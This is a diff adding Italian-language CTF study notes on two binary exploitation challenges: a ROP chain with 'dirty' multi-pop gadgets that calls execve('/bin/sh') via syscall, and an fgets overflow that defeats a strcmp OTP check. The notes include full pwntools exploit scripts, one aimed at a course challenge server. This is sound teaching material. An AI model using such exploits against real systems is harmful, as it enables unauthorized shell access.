@@ -214,6 +214,101 @@ p.interactive()
 > [!note] Perché il ROP via `ret` funziona nonostante SHSTK/IBT
 > Il `checksec` segnala **IBT** e **SHSTK** abilitati. IBT (*Indirect Branch Tracking*) pretende un `endbr64` solo come bersaglio di `call`/`jmp` **indiretti**: il `ret` non è un salto indiretto, quindi la catena ROP non lo viola. SHSTK (*Shadow Stack*) invece rileverebbe la sovrascrittura del return address — se fosse davvero **imposto a runtime** da CPU + kernel + glibc. Un ROP classico che va a segno indica che lo shadow stack è marcato nel binario ma non attivo nell'ambiente di esecuzione.
 
+### NotSoCleanROPPlayground · Gadget "sporchi" che toccano registri extra
+
+Obiettivo: `execve("/bin/sh", NULL, NULL)` tramite **syscall** diretta su un binario **No PIE**, **No canary**, con **NX** attivo e **SHSTK/IBT** marcati nel checksec. Essendo No PIE, gli indirizzi sono fissi a ogni esecuzione: non serve alcun leak (a differenza di [[#GrandmasCake · Leak del return address per battere il PIE e ROP a `execve`|GrandmasCake]], dove il PIE costringeva a ricavare la base prima della catena).
+
+Il "not so clean" del nome sta nei gadget disponibili: non ci sono i `pop rdi; ret` "puliti" (un pop per il registro che serve), ma gadget che **consumano più `pop` del necessario**, sporcando registri extra. Per usarli devi comunque fornire un valore per ogni `pop`, nell'ordine esatto in cui compaiono: i registri non voluti li riempi con valori di scarto (*junk*).
+
+La [[Calling Convention|convenzione delle syscall]] Linux x86-64 vuole: numero in `rax`, argomenti in `rdi, rsi, rdx, r10, r8, r9`. Per `execve(pathname, argv, envp)` servono `rax=59`, `rdi=&"/bin/sh"`, `rsi=0` (argv), `rdx=0` (envp). I gadget scelti (indirizzi fissi, No PIE):
+
+| Gadget | Indirizzo | Imposta | `pop` extra da riempire con junk |
+|---|---|---|---|
+| `pop rax; pop r14; pop rcx; ret` | `0x40117e` | `rax=59` | `r14`, `rcx` |
+| `pop rdi; pop rcx; pop rdx; ret` | `0x401183` | `rdi=&/bin/sh`, **`rdx=0`** | `rcx` |
+| `pop rsi; ret` | `0x401187` | `rsi=0` | — |
+| `syscall` | `0x401189` | invoca la syscall | — |
+
+Nota il colpo "furbo": il gadget per `rdi` ha un terzo `pop` verso `rdx`, quindi con lo stesso gadget si imposta anche `rdx=0` senza spendere un gadget dedicato. Per `rsi` invece c'era sia `pop rsi; pop rcx; ret` sia il più pulito `pop rsi; ret`: si sceglie il secondo, che non lascia da riempire.
+
+La stringa `/bin/sh` è già nel binario, in `.data` a `0x404040`, dentro un messaggio più lungo: `'Same as last time, here you go:/bin/sh'`. Il `/` di `/bin/sh` inizia all'**offset 31** (i 31 byte di `"Same as last time, here you go:"`), quindi l'indirizzo esatto da passare a `rdi` è `0x404040 + 31`. Essendo No PIE, è una costante valida anche da remoto.
+
+L'overflow: il buffer è 32 byte, seguiti da 8 byte di *saved rbp*; il return address viene subito dopo, quindi la catena parte a offset 40.
+
+```python
+bin_sh_addr = 0x404040 + 31        # indirizzo di "/bin/sh" dentro .data (No PIE: fisso)
+
+rax         = 0x40117e             # pop rax; pop r14; pop rcx; ret
+second_part = 0x401183             # pop rdi; pop rcx; pop rdx; ret
+rsi         = 0x401187             # pop rsi; ret
+scall       = 0x401189             # syscall
+
+payload  = b"A"*32 + b"B"*8                      # buf (32) + saved rbp (8) fino al ret
+payload += p64(rax) + p64(59) + p64(0) + p64(0)  # rax=59 (execve); r14, rcx = junk
+payload += p64(second_part) + p64(bin_sh_addr) + p64(0) + p64(0)  # rdi=&/bin/sh; rcx=junk; rdx=0 (envp)
+payload += p64(rsi) + p64(0)                     # rsi=0 (argv)
+payload += p64(scall)                            # syscall -> execve
+
+p = remote("cyberchallenge.diag.uniroma1.it", 5207)
+p.recvuntil('>')
+p.send(payload)
+p.interactive()
+```
+
+> [!warning] Correzione · `p64` una volta sola
+> Un primo tentativo definiva `bin_sh_addr = p64(0x404040 + 31)` (già impacchettato) e poi nella catena scriveva `p64(bin_sh_addr)`: un doppio `p64`. `p64` vuole un **intero** e restituisce `bytes`; passargli dei `bytes` è un errore. La regola: tieni gli indirizzi come **interi** nelle variabili e applica `p64` **una volta sola**, al momento di comporre il payload. (In questa challenge contava davvero: con indirizzi disallineati l'intera catena saltava.)
+
+> [!warning] Correzione · ogni `pop` vuole una cella, anche quelli che non ti servono
+> Con gadget "sporchi" l'errore tipico è contare solo i registri utili e dimenticare le celle per i `pop` extra. `pop rax; pop r14; pop rcx; ret` consuma **tre** valori dallo stack: se ne metti solo uno (per `rax`), i due `pop` successivi si mangiano l'indirizzo del gadget seguente e la catena si disallinea. Per ogni `pop` ci va una cella `p64(...)`, nell'ordine esatto delle istruzioni; i registri non voluti si riempiono con `p64(0)` (junk).
+
+> [!note] Niente gadget di allineamento per la syscall
+> Il dump dei gadget segnava `0x40101a ['ret']` come "MAYBE": è il classico `ret` per riallineare `RSP` a 16 byte. Qui **non serve**, perché l'allineamento a 16 byte lo pretende `movaps` dentro le funzioni di libc (es. `system`), non l'istruzione `syscall`, che passa direttamente al kernel. Stesso motivo per cui funziona nonostante **SHSTK/IBT**: `ret` non è un salto indiretto (non viola IBT) e lo shadow stack risulta marcato nel binario ma non imposto a runtime (vedi la nota analoga in [[#GrandmasCake · Leak del return address per battere il PIE e ROP a `execve`|GrandmasCake]]).
+
+### OTPOverflow · Overflow "corto" e confronto di stringhe con `strcmp`
+
+Obiettivo: superare un controllo `strcmp(user_password, otp_password) == 0` **senza conoscere** l'OTP, che è generato casualmente a ogni esecuzione. Il binario ha il **canary** attivo, ma qui non si tocca: la vulnerabilità è un overflow *corto*, che non arriva nemmeno al canary.
+
+Lo stack di `main` (letto in IDA) tiene due buffer **contigui** e, più in alto, il canary:
+
+| Variabile | Offset da `rbp` | Dimensione |
+|---|---|---|
+| `user_password` | `rbp-0x50` | 32 byte |
+| `otp_password` | `rbp-0x30` | 32 byte (più 8 di padding verso il canary) |
+| canary | `rbp-0x8` | 8 byte |
+
+Essendo adiacenti, l'inizio di `otp_password` è esattamente a **32 byte** dall'inizio di `user_password`: il 33° byte scritto in `user_password` *è* `otp_password[0]`.
+
+La falla è in `fgets(user_password, 50, stdin)`: `fgets` scrive fino a **50** byte (49 caratteri + il terminatore `\0`) in un buffer di soli 32 → *buffer overflow* di `50 - 32 = 18` byte dentro `otp_password` (gli offset 0..17). Non controlli tutto l'OTP, solo i suoi primi 18 byte — e tanto basta.
+
+Il punto chiave è **come** confronta `strcmp`: opera su *stringhe C*, cioè si ferma al primo byte `\0` (vedi la regola "parametro di lunghezza sì/no" nella sezione [[#Testo, byte e interi|tipi]] e in [[#NotSoCleanROPPlayground · Gadget "sporchi" che toccano registri extra|poco sopra]]). Quindi non serve far combaciare tutti e 32 i byte: basta che le due stringhe **coincidano fino a un `\0` che decidi tu**. E `fgets` si ferma solo sul newline, non sui `\0`, quindi con `send` di pwntools puoi piazzare un `\x00` dove vuoi.
+
+La soluzione: scrivi **la stessa stringa null-terminata** due volte — all'inizio (→ `user_password`) e a offset 32 (→ `otp_password`). Entrambe, lette come stringa, valgono lo stesso testo; la coda casuale dell'OTP resta *dopo* il `\0` e `strcmp` non la guarda mai.
+
+```python
+datasize   = 32          # dimensione di user_password
+maxbofsize = 50          # quanto scrive fgets (49 + \0)
+control    = maxbofsize - datasize   # 18 byte che sbordano nell'OTP
+
+meme = b"QUALUNQUE_STRINGA" + b"\x00"   # 17 caratteri + \0 = 18 byte (= control)
+pad  = b"P" * (datasize - control)      # 14 byte: riempie fino a offset 32
+
+payload = meme + pad + meme             # 18 + 14 + 18 = 50 byte
+# user_password -> "QUALUNQUE_STRINGA" (si ferma al \0 a offset 17)
+# otp_password  -> "QUALUNQUE_STRINGA" (seconda copia, \0 a offset 32+17)
+
+p = remote("host", porta)
+p.send(payload)        # niente sendline: il \n diventerebbe un \0 di troppo
+p.interactive()
+```
+
+Il contenuto della stringa è irrilevante (viene confrontata solo con se stessa): conta la **lunghezza** + il `\0`, perché la seconda copia deve iniziare esattamente a offset 32.
+
+> [!note] Leggere lo stack layout in IDA, senza farsi ingannare
+> Due trappole di lettura incontrate qui: (1) `__int64` / `_QWORD` sono **8 byte** (il numero nel tipo è in *bit*: 64 bit), non 4 — `DWORD` è quello da 4; un buffer che IDA spezza in `char[8]` + tre `__int64` è un'unica area **contigua** da 32 byte. (2) IDA dimensiona una variabile-array sullo stack fino alla **prossima variabile definita**: `otp_password` risultava `[40]` perché tra esso (`rbp-0x30`) e il canary (`rbp-0x8`) ci sono `0x28 = 40` byte, di cui 8 di padding di allineamento. Per l'exploit contano gli **offset**, non l'etichetta `[32]`/`[40]`.
+
+> [!tip] `fgets` e il byte nullo
+> `fgets(buf, n, stream)` legge al massimo `n-1` byte, si ferma sul **newline** (che include) o su EOF, e aggiunge sempre un `\0`. Non si ferma sui `\x00` nei dati: puoi inviarne quanti vuoi con `p.send(...)`. Per questo si usa `send` e non `sendline`: un `\n` finale verrebbe convertito in `\0` da `user_password[strcspn(..., "\n")] = 0` e sposterebbe il terminatore.
+
 ## Ripasso
 
 - **Il programma scrive un prompt senza andare a capo. Come lo riconosci?** Con `recvuntil`, usando i byte che segnano la fine del prompt.
@@ -221,6 +316,9 @@ p.interactive()
 - **Un messaggio contiene spazi finali significativi. Come li conservi?** Se il delimitatore è `b"\n"`, usa `recvuntil(b"\n", drop=True)`. Un generico `.strip()` eliminerebbe anche gli spazi.
 - **PIE attivo: come usi un leak di un return address per calcolare la base?** `base = indirizzo_leakato - offset_del_simbolo_in_IDA`, dove l'offset è quello dell'istruzione **dopo** la `call` (il return address). Poi `exe.address = base` e ogni gadget/stringa diventa `exe.search(...)` o `base + offset`.
 - **Hai trovato `/bin/sh` in `.data` ma dentro una stringa più lunga. Cosa passi a `rdi`?** L'**indirizzo** del sottostringa esatta `"/bin/sh"` (`p64(binsh)`), non i suoi byte né l'inizio del simbolo che la contiene. `exe.search(b"/bin/sh\x00")` individua l'offset giusto da solo.
+- **Hai solo un gadget `pop rax; pop r14; pop rcx; ret` e ti serve impostare `rax`. Quante celle metti nel payload?** Tre: una per `rax` col valore utile e due di junk (`p64(0)`) per i `pop` di `r14` e `rcx`, nell'ordine delle istruzioni. Ogni `pop` consuma una cella dallo stack, anche quelli che non ti interessano.
+- **ROP a `execve` via `syscall` su un binario No PIE: ti serve il gadget `ret` per allineare lo stack a 16 byte?** No. L'allineamento a 16 byte lo richiede `movaps` dentro le funzioni di libc, non l'istruzione `syscall`.
+- **Un `strcmp` confronta il tuo input con un segreto casuale che non conosci, ma puoi overfloware dentro il buffer del segreto. Come lo batti?** Scrivi la stessa stringa null-terminata sia nel tuo buffer sia (via overflow) all'inizio del buffer del segreto: `strcmp` si ferma al primo `\0`, quindi confronta solo la parte che controlli e ignora la coda casuale. Conta la posizione del `\0`, non il contenuto.
 
 ## Collegamenti
 
